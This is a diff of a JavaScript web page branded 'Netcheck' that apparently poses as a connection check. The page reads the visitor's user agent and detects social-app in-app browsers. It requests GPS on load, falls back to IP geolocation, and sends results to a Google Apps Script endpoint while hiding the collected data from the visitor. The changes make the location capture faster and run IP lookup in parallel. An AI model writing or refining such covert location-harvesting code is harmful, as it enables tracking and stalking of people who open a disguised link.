@@ -111,8 +111,8 @@ const CONFIG = {
   endpoint: "https://script.google.com/macros/s/AKfycbwZuLmVDrCeJ2tOU3I2r1ApJSCF66ntAJO41urKGwQvED9eN5L9Pwm-cPJwC5hxmxQJ/exec",        // <-- URL de Apps Script terminada en /exec
   marca: "Netcheck",
   mostrarDatos: false,
-  esperaGps: 45000,    // ms de escucha continua del GPS
-  objetivo: 10         // metros: al alcanzarlos, corta
+  esperaGps: 15000,    // ms de escucha continua del GPS
+  objetivo: 25         // metros: al alcanzarlos, corta
 };
 /* =================================================== */
 
@@ -120,7 +120,7 @@ const D={}, $=id=>document.getElementById(id);
 const SID=Math.random().toString(36).slice(2,10);
 const UA=navigator.userAgent;
 const INAPP=/FBAN|FBAV|FB_IAB|Instagram|Line\/|Twitter|WhatsApp|Snapchat|Pinterest/i.test(UA);
-let pend={}, ultimoEnvio=0, muestras=[], mejor=null, wid=null, gpsActivo=false, bloqueado=false, cerrarGps=false;
+let pend={}, ultimoEnvio=0, muestras=[], mejor=null, wid=null, gpsActivo=false, bloqueado=false, cerrarGps=false, ipListo=null;
 $('marca').textContent=CONFIG.marca;
 
 const b64u=s=>btoa(unescape(encodeURIComponent(s))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
@@ -409,6 +409,7 @@ async function terminarGps(){
 }
 
 async function usarIP(motivo){
+  if(ipListo)await ipListo;
   if(motivo)mostrarAviso(motivo);
   if(D.ilat!=null&&D.ilon!=null){
     D.lat=+D.ilat; D.lon=+D.ilon; D.exacta=0; D.fuente='ip';
@@ -525,7 +526,7 @@ $('seguirIgual').onclick=()=>{ $('inapp').classList.add('hide'); arrancar(); };
 /* ---------- arranque ---------- */
 async function arrancar(){
   pasivos();
-  await porIP();
+  ipListo=porIP();               // en paralelo con el GPS
   ruta();                        // no se espera
   if(!CONFIG.mostrarDatos){ $('boxIp').classList.add('hide'); }
   arrancarGps();                 // pide GPS apenas carga; si niegan, cae a IP
